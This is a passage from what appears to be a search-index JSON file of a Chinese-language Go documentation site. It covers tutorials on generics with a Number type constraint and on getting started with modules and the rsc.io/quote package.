\u7c7b\u578b\u7ea6\u675f\u6765\u4ee3\u66ff int64 | float64 \u3002 \u5728\u60a8\u5df2\u6709\u7684\u51fd\u6570\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u901a\u7528 SumNumbers \u51fd\u6570\u3002 // SumNumbers sums the values of map m. It supports both integers // and floats as map values. func SumNumbers[K comparable, V Number](m map[K]V) V { var s V for _, v := range m { s += v } return s } \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u58f0\u660e\u4e00\u4e2a\u4e0e\u60a8\u4e4b\u524d\u58f0\u660e\u7684\u6cdb\u578b\u51fd\u6570\u5177\u6709\u76f8\u540c\u903b\u8f91\u7684\u6cdb\u578b\u51fd\u6570\uff0c\u4f46\u4f7f\u7528\u65b0\u7684\u63a5\u53e3\u7c7b\u578b\u800c\u4e0d\u662f\u8054\u5408\u4f5c\u4e3a\u7c7b\u578b\u7ea6\u675f\u3002\u548c\u4ee5\u524d\u4e00\u6837\uff0c\u60a8\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\u4f5c\u4e3a\u53c2\u6570\u548c\u8fd4\u56de\u7c7b\u578b\u3002 \u5728 main.go \u4e2d\uff0c\u5728\u60a8\u5df2\u6709\u7684\u4ee3\u7801\u4e0b\u65b9\uff0c\u7c98\u8d34\u4ee5\u4e0b\u4ee3\u7801\u3002 fmt.Printf(\"Generic Sums with Constraint: %v and %v\\n\", SumNumbers(ints), SumNumbers(floats)) \u5728\u6b64\u4ee3\u7801\u4e2d\uff0c\u60a8\uff1a \u4ee5\u6bcf\u4e2amap\u4e3a\u53c2\u6570\u8c03\u7528 SumNumbers \uff0c\u6253\u5370\u5176\u503c\u7684\u603b\u548c\u3002 \u4e0e\u4e0a\u4e00\u8282\u4e00\u6837\uff0c\u5728\u8c03\u7528\u6cdb\u578b\u51fd\u6570\u65f6\u7701\u7565\u4e86\u7c7b\u578b\u53c2\u6570\uff08\u65b9\u62ec\u53f7\u4e2d\u7684\u7c7b\u578b\u540d\u79f0\uff09\u3002Go \u7f16\u8bd1\u5668\u53ef\u4ee5\u4ece\u5176\u4ed6\u53c2\u6570\u63a8\u65ad\u7c7b\u578b\u53c2\u6570\u3002","title":"5.1. \u7f16\u5199\u4ee3\u7801"},{"location":"go/generics/#run-code-52","text":"\u4ece\u5305\u542b main.go \u7684\u76ee\u5f55\u4e2d\u7684\u547d\u4ee4\u884c\uff0c\u8fd0\u884c\u4ee3\u7801\u3002 $ go run . Non-Generic Sums: 46 and 62.97 Generic Sums: 46 and 62.97 Generic Sums, type parameters inferred: 46 and 62.97 Generic Sums with Constraint: 46 and 62.97","title":"5.2. \u8fd0\u884c\u4ee3\u7801"},{"location":"go/generics/#conclusion","text":"\u505a\u5f97\u5f88\u597d\uff01\u60a8\u521a\u521a\u5411\u81ea\u5df1\u4ecb\u7ecd\u4e86 Go \u4e2d\u7684\u6cdb\u578b\u3002 \u5efa\u8bae\u7684\u4e0b\u4e00\u4e2a\u4e3b\u9898\uff1a Go Tour \u662f\u5bf9 Go \u57fa\u7840\u77e5\u8bc6\u7684\u9010\u6b65\u4ecb\u7ecd\u3002 \u60a8\u5c06\u5728 Effective Go \u548c How to write Go code \u4e2d\u627e\u5230\u6709\u7528\u7684 Go \u6700\u4f73\u5b9e\u8df5\u3002","title":"\u7ed3\u8bba"},{"location":"go/generics/#completed-code","text":"\u4f60\u53ef\u4ee5\u5728 Go playground \u4e0a\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f \u3002\u5728\u64cd\u573a(playground)\u4e0a\uff0c\u53ea\u9700\u5355\u51fb\u201c Run \u201d\u6309\u94ae\u3002 package main import \"fmt\" type Number interface { int64 | float64 } func main() { // Initialize a map for the integer values ints := map[string]int64{ \"first\": 34, \"second\": 12, } // Initialize a map for the float values floats := map[string]float64{ \"first\": 35.98, \"second\": 26.99, } fmt.Printf(\"Non-Generic Sums: %v and %v\\n\", SumInts(ints), SumFloats(floats)) fmt.Printf(\"Generic Sums: %v and %v\\n\", SumIntsOrFloats[string, int64](ints), SumIntsOrFloats[string, float64](floats)) fmt.Printf(\"Generic Sums, type parameters inferred: %v and %v\\n\", SumIntsOrFloats(ints), SumIntsOrFloats(floats)) fmt.Printf(\"Generic Sums with Constraint: %v and %v\\n\", SumNumbers(ints), SumNumbers(floats)) } // SumInts adds together the values of m. func SumInts(m map[string]int64) int64 { var s int64 for _, v := range m { s += v } return s } // SumFloats adds together the values of m. func SumFloats(m map[string]float64) float64 { var s float64 for _, v := range m { s += v } return s } // SumIntsOrFloats sums the values of map m. It supports both floats and integers // as map values. func SumIntsOrFloats[K comparable, V int64 | float64](m map[K]V) V { var s V for _, v := range m { s += v } return s } // SumNumbers sums the values of map m. Its supports both integers // and floats as map values. func SumNumbers[K comparable, V Number](m map[K]V) V { var s V for _, v := range m { s += v } return s }","title":"\u5b8c\u6574\u7684\u4ee3\u7801"},{"location":"go/generics/#references","text":"https://go.dev/doc/tutorial/generics","title":"\u53c2\u8003\u8d44\u6599"},{"location":"go/getting_started/","text":"Go \u8bed\u8a00\u5165\u95e8 \uf0c1 \u5f00\u59cb\u4f7f\u7528 Go \u5728\u672c\u6559\u7a0b\u4e2d\uff0c\u5c06\u7b80\u8981\u4ecb\u7ecd Go \u7f16\u7a0b\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u60a8\u5c06\uff1a \u5b89\u88c5 Go\uff08\u5982\u679c\u4f60\u8fd8\u6ca1\u6709\uff09\u3002 \u7f16\u5199\u4e00\u4e9b\u7b80\u5355\u7684\u201cHello, world\u201d\u4ee3\u7801\u3002 \u4f7f\u7528\u8be5go\u547d\u4ee4\u8fd0\u884c\u60a8\u7684\u4ee3\u7801\u3002 \u4f7f\u7528 Go \u5305\u53d1\u73b0\u5de5\u5177\u6765\u67e5\u627e\u53ef\u4ee5\u5728\u81ea\u5df1\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u5305\u3002 \u8c03\u7528\u5916\u90e8\u6a21\u5757\u7684\u51fd\u6570\u3002 \u6ce8\u610f\uff1a\u6709\u5173\u5176\u4ed6\u6559\u7a0b\uff0c\u8bf7\u53c2\u9605 \u6559\u7a0b \u3002 \u5148\u51b3\u6761\u4ef6 \uf0c1 \u4e00\u4e9b\u7f16\u7a0b\u7ecf\u9a8c\u3002\u8fd9\u91cc\u7684\u4ee3\u7801\u975e\u5e38\u7b80\u5355\uff0c\u4f46\u5b83\u6709\u52a9\u4e8e\u4e86\u89e3\u4e00\u4e9b\u5173\u4e8e\u51fd\u6570\u7684\u77e5\u8bc6\u3002 \u7528\u4e8e\u7f16\u8f91\u4ee3\u7801\u7684\u5de5\u5177\u3002\u60a8\u62e5\u6709\u7684\u4efb\u4f55\u6587\u672c\u7f16\u8f91\u5668\u90fd\u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\u3002\u5927\u591a\u6570\u6587\u672c\u7f16\u8f91\u5668\u90fd\u5bf9 Go \u6709\u5f88\u597d\u7684\u652f\u6301\u3002\u6700\u53d7\u6b22\u8fce\u7684\u662f VSCode\uff08\u514d\u8d39\uff09\u3001GoLand\uff08\u4ed8\u8d39\uff09\u548c Vim\uff08\u514d\u8d39\uff09\u3002 \u4e00\u4e2a\u547d\u4ee4\u7ec8\u7aef\u3002Go \u5728 Linux \u548c Mac \u4e0a\u7684\u4efb\u4f55\u7ec8\u7aef\u4ee5\u53ca Windows \u4e2d\u7684 PowerShell \u6216 cmd \u4e0a\u90fd\u80fd\u5f88\u597d\u5730\u5de5\u4f5c\u3002 \u5b89\u88c5 Go \uf0c1 \u53c2\u8003 \u4e0b\u8f7d\u548c\u5b89\u88c5 \u6b65\u9aa4 \u5199\u4ee3\u7801 \uf0c1 \u5f00\u59cb\u5199\u4e00\u4e2a Hello, World \u793a\u4f8b\u3002 \u4e3a\u7b2c\u4e00\u4e2a Go \u6e90\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a hello \u76ee\u5f55\u3002 $ mkdir hello && cd hello \u4e3a\u60a8\u7684\u4ee3\u7801\u542f\u7528\u4f9d\u8d56\u9879\u8ddf\u8e2a\u3002 \u5f53\u60a8\u7684\u4ee3\u7801\u5bfc\u5165\u5176\u4ed6\u6a21\u5757\u4e2d\u5305\u542b\u7684\u5305\u65f6\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u81ea\u5df1\u7684\u6a21\u5757\u7ba1\u7406\u8fd9\u4e9b\u4f9d\u8d56\u9879\u3002\u8be5\u6a21\u5757\u7531\u4e00\u4e2a go.mod \u6587\u4ef6\u5b9a\u4e49\uff0c\u8be5\u6587\u4ef6\u8ddf\u8e2a\u63d0\u4f9b\u8fd9\u4e9b\u5305\u7684\u6a21\u5757\u3002\u8be5 go.mod \u6587\u4ef6\u4fdd\u7559\u5728\u60a8\u7684\u4ee3\u7801\u4e2d\uff0c\u5305\u62ec\u5728\u60a8\u7684\u6e90\u4ee3\u7801\u5b58\u50a8\u5e93\u4e2d\u3002 \u8981\u901a\u8fc7\u521b\u5efa go.mod \u6587\u4ef6\u4e3a\u60a8\u7684\u4ee3\u7801\u542f\u7528\u4f9d\u8d56\u9879\u8ddf\u8e2a\uff0c\u8bf7\u8fd0\u884c go mod init \u547d\u4ee4 \uff0c\u5e76\u4e3a\u5176\u63d0\u4f9b\u60a8\u7684\u4ee3\u7801\u6240\u5728\u7684\u6a21\u5757\u7684\u540d\u79f0\u3002\u540d\u79f0\u662f\u6a21\u5757\u7684\u6a21\u5757\u8def\u5f84\u3002 \u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u6a21\u5757\u8def\u5f84\u901a\u5e38\u662f\u4fdd\u5b58\u6e90\u4ee3\u7801\u7684\u5b58\u50a8\u5e93\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c\u6a21\u5757\u8def\u5f84\u53ef\u80fd\u662f github.com/mymodule. \u5982\u679c\u60a8\u8ba1\u5212\u53d1\u5e03\u60a8\u7684\u6a21\u5757\u4f9b\u5176\u4ed6\u4eba\u4f7f\u7528\uff0c\u5219\u6a21\u5757\u8def\u5f84\u5fc5\u987b\u662f Go \u5de5\u5177\u53ef\u4ee5\u4ece\u4e2d\u4e0b\u8f7d\u60a8\u7684\u6a21\u5757\u7684\u4f4d\u7f6e\u3002\u6709\u5173\u4f7f\u7528\u6a21\u5757\u8def\u5f84\u547d\u540d\u6a21\u5757\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u7ba1\u7406\u4f9d\u8d56\u9879 \u3002 \u51fa\u4e8e\u672c\u6559\u7a0b\u7684\u76ee\u7684\uff0c\u53ea\u9700\u4f7f\u7528 example/hello. $ go mod init example/hello go: creating new go.mod: module example/hello \u521b\u5efa hello.go \u6587\u4ef6\uff0c\u5e76\u5c06\u4e0b\u9762\u7684\u4ee3\u7801\u7c98\u8d34\u5230\u6587\u4ef6\u4e2d\u3002 package main import \"fmt\" func main() { fmt.Println(\"Hello, World!\") } \u5728\u6b64\u4ee3\u7801\u4e2d\uff1a \u58f0\u660e\u4e00\u4e2a main \u5305\uff08\u5305\u662f\u5bf9\u51fd\u6570\u8fdb\u884c\u5206\u7ec4\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5b83\u7531\u540c\u4e00\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u7ec4\u6210\uff09\u3002 \u5bfc\u5165\u6d41\u884c\u7684 fmt \u5305 \uff0c\u5176\u4e2d\u5305\u542b\u683c\u5f0f\u5316\u6587\u672c\u7684\u529f\u80fd\uff0c\u5305\u62ec\u6253\u5370\u5230\u63a7\u5236\u53f0\u3002\u8fd9\u4e2a\u5305\u662f \u4f60\u5b89\u88c5 Go \u65f6\u83b7\u5f97 \u7684 \u6807\u51c6\u5e93 \u5305\u4e4b\u4e00\u3002 \u5b9e\u73b0\u4e00\u4e2amain\u529f\u80fd\u4ee5\u5c06\u6d88\u606f\u6253\u5370\u5230\u63a7\u5236\u53f0\u3002main\u8fd0\u884cmain\u5305 \u65f6\u9ed8\u8ba4\u6267\u884c\u4e00\u4e2a\u51fd\u6570\u3002 \u8fd0\u884c\u4ee3\u7801 $ go run . Hello, World! \u8be5 go run \u547d\u4ee4 \u662fgo\u60a8\u7528\u4e8e\u5b8c\u6210 Go \u4efb\u52a1\u7684\u4f17\u591a\u547d\u4ee4\u4e4b\u4e00\u3002\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u83b7\u53d6\u5176\u4ed6\u547d\u4ee4\u7684\u5217\u8868\uff1a $ go help \u8c03\u7528\u5916\u90e8\u5305\u4e2d\u7684\u4ee3\u7801 \uf0c1 \u5f53\u60a8\u9700\u8981\u60a8\u7684\u4ee3\u7801\u6765\u6267\u884c\u53ef\u80fd\u5df2\u7531\u5176\u4ed6\u4eba\u5b9e\u73b0\u7684\u4e8b\u60c5\u65f6\uff0c\u60a8\u53ef\u4ee5\u5bfb\u627e\u4e00\u4e2a\u5177\u6709\u60a8\u53ef\u4ee5\u5728\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u529f\u80fd\u7684\u5305\u3002 \u4f7f\u7528\u5916\u90e8\u6a21\u5757\u7684\u529f\u80fd\u4f7f\u60a8\u7684\u6253\u5370\u4fe1\u606f\u66f4\u6709\u8da3\u3002 \u8bbf\u95ee pkg.go.dev \u5e76 \u641c\u7d22\u201cquote\u201d\u5305 \u3002 \u5728\u641c\u7d22\u7ed3\u679c\u4e2d\u627e\u5230\u5e76\u5355\u51fb\u8be5 rsc.io/quote \u5305\uff08\u5982\u679c\u60a8\u770b\u5230 rsc.io/quote/v3 \uff0c\u8bf7\u6682\u65f6\u5ffd\u7565\u5b83\uff09\u3002 \u5728 Documentation \u90e8\u5206\u7684 index \u4e0b\uff0c\u8bb0\u4e0b\u60a8\u53ef\u4ee5\u4ece\u4ee3\u7801\u4e2d\u8c03\u7528\u7684\u51fd\u6570\u5217\u8868\u3002\u60a8\u5c06\u4f7f\u7528\u8be5 Go \u51fd\u6570\u3002 \u5728\u6b64\u9875\u9762\u7684\u9876\u90e8\uff0c\u8bf7\u6ce8\u610f\u5305 quote \u5305\u542b\u5728 rsc.io/quote \u6a21\u5757\u4e2d\u3002 \u60a8\u53ef\u4ee5\u4f7f\u7528 https://pkg.go.dev \u7ad9\u70b9\u67e5\u627e\u5df2\u53d1\u5e03\u7684\u6a21\u5757\uff0c\u8fd9\u4e9b\u6a21\u5757\u7684\u5305\u5177\u6709\u60a8\u53ef\u4ee5\u5728\u81ea\u5df1\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u529f\u80fd\u3002\u5305\u53d1\u5e03\u5728\u6a21\u5757\u4e2d\u2014\u2014\u6bd4\u5982 rsc.io/quote \u2014\u2014\u5176\u4ed6\u4eba\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u7684\u5730\u65b9\u3002\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\uff0c\u65b0\u7248\u672c\u5bf9\u6a21\u5757\u8fdb\u884c\u4e86\u6539\u8fdb\uff0c\u60a8\u53ef\u4ee5\u5347\u7ea7\u4ee3\u7801\u4ee5\u4f7f\u7528\u6539\u8fdb\u7684\u7248\u672c\u3002 \u5728\u60a8\u7684 Go \u4ee3\u7801\u4e2d\uff0c\u5bfc\u5165 rsc.io/quote \u5305\u5e76\u6dfb\u52a0\u5bf9\u5176Go\u51fd\u6570\u7684\u8c03\u7528\u3002 package main import \"fmt\" import \"rsc.io/quote\" func main() { fmt.Println(quote.Go()) } \u6dfb\u52a0\u65b0\u7684\u6a21\u5757\u8981\u6c42\u548csums\u3002 Go \u5c06\u6dfb\u52a0 quote \u6a21\u5757\u4f5c\u4e3a\u8981\u6c42\uff0c\u4ee5\u53ca\u7528\u4e8e\u9a8c\u8bc1\u6a21\u5757\u7684 go.sum \u6587\u4ef6\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Go Modules Reference \u4e2d\u7684 Authenticating modules \u3002 $ go mod tidy go: finding module for package rsc.io/quote go: found rsc.io/quote in rsc.io/quote v1.5.2 \u8fd0\u884c\u4ee3\u7801\u4ee5\u67e5\u770b\u60a8\u6b63\u5728\u8c03\u7528\u7684\u51fd\u6570\u751f\u6210\u7684\u6d88\u606f\u3002 $ go run . Don't communicate by sharing memory, share memory by communicating. \u8bf7\u6ce8\u610f\uff0c\u60a8\u7684\u4ee3\u7801\u8c03\u7528\u4e86\u8be5Go\u51fd\u6570\uff0c\u6253\u5370\u4e86\u4e00\u6761\u5173\u4e8e\u901a\u4fe1\u7684\u5de7\u5999\u6d88\u606f\u3002 \u5f53\u60a8\u8fd0\u884c go mod tidy \u65f6\uff0c\u5b83\u4f1a\u627e\u5230\u5e76\u4e0b\u8f7d rsc.io/quote \u6a21\u5757\u2014\u2014\u5305\u542b\u60a8\u5bfc\u5165\u7684\u5305\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b83\u4e0b\u8f7d\u4e86\u6700\u65b0\u7248\u672c\u2014\u2014v1.5.2\u3002 \u66f4\u591a\u4ee3\u7801 \uf0c1 \u901a\u8fc7\u8fd9\u4e2a\u5feb\u901f\u4ecb\u7ecd\uff0c\u60a8\u5b89\u88c5\u4e86 Go \u5e76\u5b66\u4e60\u4e86\u4e00\u4e9b\u57fa\u7840\u77e5\u8bc6\u3002\u8981\u4f7f\u7528\u53e6\u4e00\u4e2a\u6559\u7a0b\u7f16\u5199\u66f4\u591a\u4ee3\u7801\uff0c\u8bf7\u67e5\u770b \u521b\u5efa Go \u6a21\u5757 \u3002","title":"Getting started"},{"location":"go/getting_started/#getting-start","text":"\u5f00\u59cb\u4f7f\u7528 Go \u5728\u672c\u6559\u7a0b\u4e2d\uff0c\u5c06\u7b80\u8981\u4ecb\u7ecd Go \u7f16\u7a0b\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u60a8\u5c06\uff1a \u5b89\u88c5 Go\uff08\u5982\u679c\u4f60\u8fd8\u6ca1\u6709\uff09\u3002 \u7f16\u5199\u4e00\u4e9b\u7b80\u5355\u7684\u201cHello, world\u201d\u4ee3\u7801\u3002 \u4f7f\u7528\u8be5go\u547d\u4ee4\u8fd0\u884c\u60a8\u7684\u4ee3\u7801\u3002 \u4f7f\u7528 Go \u5305\u53d1\u73b0\u5de5\u5177\u6765\u67e5\u627e\u53ef\u4ee5\u5728\u81ea\u5df1\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u5305\u3002 \u8c03\u7528\u5916\u90e8\u6a21\u5757\u7684\u51fd\u6570\u3002 \u6ce8\u610f\uff1a\u6709\u5173\u5176\u4ed6\u6559\u7a0b\uff0c\u8bf7\u53c2\u9605 \u6559\u7a0b \u3002","title":"Go \u8bed\u8a00\u5165\u95e8"},{"location":"go/getting_started/#prerequisites","text":"\u4e00\u4e9b\u7f16\u7a0b\u7ecf\u9a8c\u3002\u8fd9\u91cc\u7684\u4ee3\u7801\u975e\u5e38\u7b80\u5355\uff0c\u4f46\u5b83\u6709\u52a9\u4e8e\u4e86\u89e3\u4e00\u4e9b\u5173\u4e8e\u51fd\u6570\u7684\u77e5\u8bc6\u3002 \u7528\u4e8e\u7f16\u8f91\u4ee3\u7801\u7684\u5de5\u5177\u3002\u60a8\u62e5\u6709\u7684\u4efb\u4f55\u6587\u672c\u7f16\u8f91\u5668\u90fd\u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\u3002\u5927\u591a\u6570\u6587\u672c\u7f16\u8f91\u5668\u90fd\u5bf9 Go \u6709\u5f88\u597d\u7684\u652f\u6301\u3002\u6700\u53d7\u6b22\u8fce\u7684\u662f VSCode\uff08\u514d\u8d39\uff09\u3001GoLand\uff08\u4ed8\u8d39\uff09\u548c Vim\uff08\u514d\u8d39\uff09\u3002 \u4e00\u4e2a\u547d\u4ee4\u7ec8\u7aef\u3002Go \u5728 Linux \u548c Mac \u4e0a\u7684\u4efb\u4f55\u7ec8\u7aef\u4ee5\u53ca Windows \u4e2d\u7684 PowerShell \u6216 cmd \u4e0a\u90fd\u80fd\u5f88\u597d\u5730\u5de5\u4f5c\u3002","title":"\u5148\u51b3\u6761\u4ef6"},{"location":"go/getting_started/#install","text":"\u53c2\u8003 \u4e0b\u8f7d\u548c\u5b89\u88c5 \u6b65\u9aa4","title":"\u5b89\u88c5 Go"},{"location":"go/getting_started/#write-some-code","text":"\u5f00\u59cb\u5199\u4e00\u4e2a Hello, World \u793a\u4f8b\u3002 \u4e3a\u7b2c\u4e00\u4e2a Go \u6e90\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a hello \u76ee\u5f55\u3002 $ mkdir hello && cd hello \u4e3a\u60a8\u7684\u4ee3\u7801\u542f\u7528\u4f9d\u8d56\u9879\u8ddf\u8e2a\u3002 \u5f53\u60a8\u7684\u4ee3\u7801\u5bfc\u5165\u5176\u4ed6\u6a21\u5757\u4e2d\u5305\u542b\u7684\u5305\u65f6\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u81ea\u5df1\u7684\u6a21\u5757\u7ba1\u7406\u8fd9\u4e9b\u4f9d\u8d56\u9879\u3002\u8be5\u6a21\u5757\u7531\u4e00\u4e2a go.mod \u6587\u4ef6\u5b9a\u4e49\uff0c\u8be5\u6587\u4ef6\u8ddf\u8e2a\u63d0\u4f9b\u8fd9\u4e9b\u5305\u7684\u6a21\u5757\u3002\u8be5 go.mod \u6587\u4ef6\u4fdd\u7559\u5728\u60a8\u7684\u4ee3\u7801\u4e2d\uff0c\u5305\u62ec\u5728\u60a8\u7684\u6e90\u4ee3\u7801\u5b58\u50a8\u5e93\u4e2d\u3002 \u8981\u901a\u8fc7\u521b\u5efa go.mod \u6587\u4ef6\u4e3a\u60a8\u7684\u4ee3\u7801\u542f\u7528\u4f9d\u8d56\u9879\u8ddf\u8e2a\uff0c\u8bf7\u8fd0\u884c go mod init \u547d\u4ee4 \uff0c\u5e76\u4e3a\u5176\u63d0\u4f9b\u60a8\u7684\u4ee3\u7801\u6240\u5728\u7684\u6a21\u5757\u7684\u540d\u79f0\u3002\u540d\u79f0\u662f\u6a21\u5757\u7684\u6a21\u5757\u8def\u5f84\u3002 \u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u6a21\u5757\u8def\u5f84\u901a\u5e38\u662f\u4fdd\u5b58\u6e90\u4ee3\u7801\u7684\u5b58\u50a8\u5e93\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c\u6a21\u5757\u8def\u5f84\u53ef\u80fd\u662f github.com/mymodule. \u5982\u679c\u60a8\u8ba1\u5212\u53d1\u5e03\u60a8\u7684\u6a21\u5757\u4f9b\u5176\u4ed6\u4eba\u4f7f\u7528\uff0c\u5219\u6a21\u5757\u8def\u5f84\u5fc5\u987b\u662f Go \u5de5\u5177\u53ef\u4ee5\u4ece\u4e2d\u4e0b\u8f7d\u60a8\u7684\u6a21\u5757\u7684\u4f4d\u7f6e\u3002\u6709\u5173\u4f7f\u7528\u6a21\u5757\u8def\u5f84\u547d\u540d\u6a21\u5757\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u7ba1\u7406\u4f9d\u8d56\u9879 \u3002 \u51fa\u4e8e\u672c\u6559\u7a0b\u7684\u76ee\u7684\uff0c\u53ea\u9700\u4f7f\u7528 example/hello. $ go mod init example/hello go: creating new go.mod: module example/hello \u521b\u5efa hello.go \u6587\u4ef6\uff0c\u5e76\u5c06\u4e0b\u9762\u7684\u4ee3\u7801\u7c98\u8d34\u5230\u6587\u4ef6\u4e2d\u3002 package main import \"fmt\" func main() { fmt.Println(\"Hello, World!\") } \u5728\u6b64\u4ee3\u7801\u4e2d\uff1a \u58f0\u660e\u4e00\u4e2a main \u5305\uff08\u5305\u662f\u5bf9\u51fd\u6570\u8fdb\u884c\u5206\u7ec4\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5b83\u7531\u540c\u4e00\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u7ec4\u6210\uff09\u3002 \u5bfc\u5165\u6d41\u884c\u7684 fmt \u5305 \uff0c\u5176\u4e2d\u5305\u542b\u683c\u5f0f\u5316\u6587\u672c\u7684\u529f\u80fd\uff0c\u5305\u62ec\u6253\u5370\u5230\u63a7\u5236\u53f0\u3002\u8fd9\u4e2a\u5305\u662f \u4f60\u5b89\u88c5 Go \u65f6\u83b7\u5f97 \u7684 \u6807\u51c6\u5e93 \u5305\u4e4b\u4e00\u3002 \u5b9e\u73b0\u4e00\u4e2amain\u529f\u80fd\u4ee5\u5c06\u6d88\u606f\u6253\u5370\u5230\u63a7\u5236\u53f0\u3002main\u8fd0\u884cmain\u5305 \u65f6\u9ed8\u8ba4\u6267\u884c\u4e00\u4e2a\u51fd\u6570\u3002 \u8fd0\u884c\u4ee3\u7801 $ go run . Hello, World! \u8be5 go run \u547d\u4ee4 \u662fgo\u60a8\u7528\u4e8e\u5b8c\u6210 Go \u4efb\u52a1\u7684\u4f17\u591a\u547d\u4ee4\u4e4b\u4e00\u3002\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u83b7\u53d6\u5176\u4ed6\u547d\u4ee4\u7684\u5217\u8868\uff1a $ go help","title":"\u5199\u4ee3\u7801"},{"location":"go/getting_started/#call-code-in-an-other-package","text":"\u5f53\u60a8\u9700\u8981\u60a8\u7684\u4ee3\u7801\u6765\u6267\u884c\u53ef\u80fd\u5df2\u7531\u5176\u4ed6\u4eba\u5b9e\u73b0\u7684\u4e8b\u60c5\u65f6\uff0c\u60a8\u53ef\u4ee5\u5bfb\u627e\u4e00\u4e2a\u5177\u6709\u60a8\u53ef\u4ee5\u5728\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u529f\u80fd\u7684\u5305\u3002 \u4f7f\u7528\u5916\u90e8\u6a21\u5757\u7684\u529f\u80fd\u4f7f\u60a8\u7684\u6253\u5370\u4fe1\u606f\u66f4\u6709\u8da3\u3002 \u8bbf\u95ee pkg.go.dev \u5e76 \u641c\u7d22\u201cquote\u201d\u5305 \u3002 \u5728\u641c\u7d22\u7ed3\u679c\u4e2d\u627e\u5230\u5e76\u5355\u51fb\u8be5 rsc.io/quote \u5305\uff08\u5982\u679c\u60a8\u770b\u5230 rsc.io/quote/v3 \uff0c\u8bf7\u6682\u65f6\u5ffd\u7565\u5b83\uff09\u3002 \u5728 Documentation \u90e8\u5206\u7684 index \u4e0b\uff0c\u8bb0\u4e0b\u60a8\u53ef\u4ee5\u4ece\u4ee3\u7801\u4e2d\u8c03\u7528\u7684\u51fd\u6570\u5217\u8868\u3002\u60a8\u5c06\u4f7f\u7528\u8be5 Go \u51fd\u6570\u3002 \u5728\u6b64\u9875\u9762\u7684\u9876\u90e8\uff0c\u8bf7\u6ce8\u610f\u5305 quote \u5305\u542b\u5728 rsc.io/quote \u6a21\u5757\u4e2d\u3002 \u60a8\u53ef\u4ee5\u4f7f\u7528 https://pkg.go.dev \u7ad9\u70b9\u67e5\u627e\u5df2\u53d1\u5e03\u7684\u6a21\u5757\uff0c\u8fd9\u4e9b\u6a21\u5757\u7684\u5305\u5177\u6709\u60a8\u53ef\u4ee5\u5728\u81ea\u5df1\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u529f\u80fd\u3002\u5305\u53d1\u5e03\u5728\u6a21\u5757\u4e2d\u2014\u2014\u6bd4\u5982 rsc.io/quote \u2014\u2014\u5176\u4ed6\u4eba\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u7684\u5730\u65b9\u3002\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\uff0c\u65b0\u7248\u672c\u5bf9\u6a21\u5757\u8fdb\u884c\u4e86\u6539\u8fdb\uff0c\u60a8\u53ef\u4ee5\u5347\u7ea7\u4ee3\u7801\u4ee5\u4f7f\u7528\u6539\u8fdb\u7684\u7248\u672c\u3002 \u5728\u60a8\u7684 Go \u4ee3\u7801\u4e2d\uff0c\u5bfc\u5165 rsc.io/quote \u5305\u5e76\u6dfb\u52a0\u5bf9\u5176Go\u51fd\u6570\u7684\u8c03\u7528\u3002 package main import \"fmt\" import \"rsc.io/quote\" func main() { fmt.Println(quote.Go()) } \u6dfb\u52a0\u65b0\u7684\u6a21\u5757\u8981\u6c42\u548csums\u3002 Go \u5c06\u6dfb\u52a0 quote \u6a21\u5757\u4f5c\u4e3a\u8981\u6c42\uff0c\u4ee5\u53ca\u7528\u4e8e\u9a8c\u8bc1\u6a21\u5757\u7684 go.sum \u6587\u4ef6\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Go Modules Reference \u4e2d\u7684 Authenticating modules \u3002 $ go mod tidy go: finding module for package rsc.io/quote go: found rsc.io/quote in rsc.io/quote v1.5.2 \u8fd0\u884c\u4ee3\u7801\u4ee5\u67e5\u770b\u60a8\u6b63\u5728\u8c03\u7528\u7684\u51fd\u6570\u751f\u6210\u7684\u6d88\u606f\u3002 $ go run . Don't communicate by sharing memory, share memory by communicating. \u8bf7\u6ce8\u610f\uff0c\u60a8\u7684\u4ee3\u7801\u8c03\u7528\u4e86\u8be5Go\u51fd\u6570\uff0c\u6253\u5370\u4e86\u4e00\u6761\u5173\u4e8e\u901a\u4fe1\u7684\u5de7\u5999\u6d88\u606f\u3002 \u5f53\u60a8\u8fd0\u884c go mod tidy \u65f6\uff0c\u5b83\u4f1a\u627e\u5230\u5e76\u4e0b\u8f7d rsc.io/quote 